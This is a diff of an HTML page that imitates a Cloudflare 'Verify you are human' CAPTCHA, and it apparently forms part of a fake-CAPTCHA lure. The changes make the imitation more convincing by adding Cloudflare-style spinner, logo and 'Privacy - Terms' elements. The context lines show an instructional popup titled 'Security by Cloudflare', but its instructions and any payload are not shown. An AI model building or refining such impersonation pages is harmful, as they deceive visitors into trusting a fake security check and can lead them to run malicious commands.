@@ -8,22 +8,20 @@
 </head>
 <body>
 
-    <!-- Loading Spinner -->
-    <div id="loading-screen">
-        <h1>Verifying you are human...</h1>
-        <div class="spinner"></div>
-    </div>
-
-    <!-- CAPTCHA Container (Hidden Initially) -->
-    <div class="container" id="captcha-container">
+    <!-- CAPTCHA Container -->
+    <div class="container">
         <h1 id="domain-name"></h1>
         <p>Verifying you are human. This may take a few seconds.</p>
 
         <div class="captcha-box">
             <input type="checkbox" id="captcha" onclick="verifyCaptcha()">
             <label for="captcha">
+                <div class="checkbox-ui">
+                    <div class="spinner" id="verify-spinner"></div>
+                </div>
                 <span>Verify you are human</span>
                 <img src="cloudflare.png" alt="Cloudflare Logo" id="cf-logo">
+                <span class="cf-text">Privacy - Terms</span>
             </label>
         </div>
 
@@ -32,7 +30,7 @@
         </p>
     </div>
 
-    <!-- Instructional Popup (Hidden Initially) -->
+    <!-- Instructional Popup -->
     <div id="instruction-popup">
         <div class="popup-content">
             <h2>Security by Cloudflare</h2>
